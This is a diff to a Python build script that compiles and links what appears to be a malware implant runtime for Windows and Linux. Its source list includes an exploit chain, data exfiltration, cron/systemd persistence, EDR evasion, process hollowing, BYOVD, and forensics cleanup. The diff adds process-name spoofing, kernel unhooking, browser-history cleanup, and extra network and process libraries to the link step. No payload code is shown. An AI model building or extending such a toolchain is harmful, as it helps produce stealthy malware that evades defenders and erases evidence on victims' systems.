@@ -425,10 +425,11 @@ def stage_compile_runtime(build_dir, platform="windows"):
             LINUX / "kernel" / "module_ops.c",               # Module resolution + syscall table
             LINUX / "exploitation" / "fence2pwn.c",          # FENCE2PWN exploit chain
             LINUX / "exfil" / "exfil_channels.c",            # Data exfiltration
-            LINUX / "core" / "link_stubs.c",                  # Link stubs for undefined references
 
             # New APIs (Production scripts)
-            LINUX / "persistence.c",                         # Cron/systemd persistence
+            LINUX / "persistence" / "cron_systemd.c",       # Cron/systemd persistence
+            LINUX / "kernel" / "module_loader.c",           # Module loading & FENCE2PWN
+            LINUX / "missing_apis.c",                       # Additional missing runtime APIs
             LINUX / "forensics" / "cleanup.c",               # Forensics cleanup
             LINUX / "forensics" / "linux_forensics.c",       # Linux-specific forensics
             RUNTIME_DIR / "common" / "encoding.c",           # Base64/hex encoding
@@ -447,6 +448,7 @@ def stage_compile_runtime(build_dir, platform="windows"):
             LINUX / "syscalls" / "signal_syscall.c",
             LINUX / "syscalls" / "ipc_syscall.c",
             LINUX / "syscalls" / "sysinfo_syscall.c",
+            LINUX / "stubs.c",
         ]
 
         for src in sources:
@@ -512,6 +514,8 @@ def stage_compile_runtime(build_dir, platform="windows"):
         WIN / "evasion" / "edrhoker.c",
         WIN / "evasion" / "advanced_edr.c",
         WIN / "evasion" / "edr_throttle_profiler.c",  # EDR profiler for adaptive behavior
+        WIN / "evasion" / "process_spoofing.c",  # Process name spoofing & kernel unhooking
+        WIN / "anti_forensics" / "cache_cleanup.c",  # Browser cache & history cleanup
         WIN / "execution" / "hollow.c",
         WIN / "execution" / "byovd.c",
         WIN / "execution" / "inmem.c",
@@ -529,6 +533,7 @@ def stage_compile_runtime(build_dir, platform="windows"):
         WIN / "exfil" / "enhanced_exfiltration.c",
         WIN / "network" / "http.c",
         RUNTIME_DIR / "common" / "encoding.c",
+        RUNTIME_DIR / "compression" / "compression_simple.c",
     ]
 
     cflags_win = [
@@ -667,8 +672,8 @@ def stage_link(obj_path, runtime_objs, build_dir, output_name, platform="windows
             linker,
             "--target=x86_64-pc-windows-gnu",
             *all_objs,
-            "-lntdll", "-lwinhttp", "-ldnsapi", "-lwevtapi",
-            "-ladvapi32", "-lkernel32", "-lws2_32",
+            "-lntdll", "-lwinhttp", "-lwininet", "-ldnsapi", "-lwevtapi",
+            "-ladvapi32", "-lkernel32", "-lws2_32", "-lpsapi",
             "-o", str(exe_path),
         ]
     else:
@@ -676,8 +681,8 @@ def stage_link(obj_path, runtime_objs, build_dir, output_name, platform="windows
             linker,
             *linker_flags,
             *all_objs,
-            "-lntdll", "-lwinhttp", "-ldnsapi", "-lwevtapi",
-            "-ladvapi32", "-lkernel32", "-lws2_32",
+            "-lntdll", "-lwinhttp", "-lwininet", "-ldnsapi", "-lwevtapi",
+            "-ladvapi32", "-lkernel32", "-lws2_32", "-lpsapi",
             "-o", str(exe_path),
         ]
     run(cmd, "Link PE executable", env=link_env)
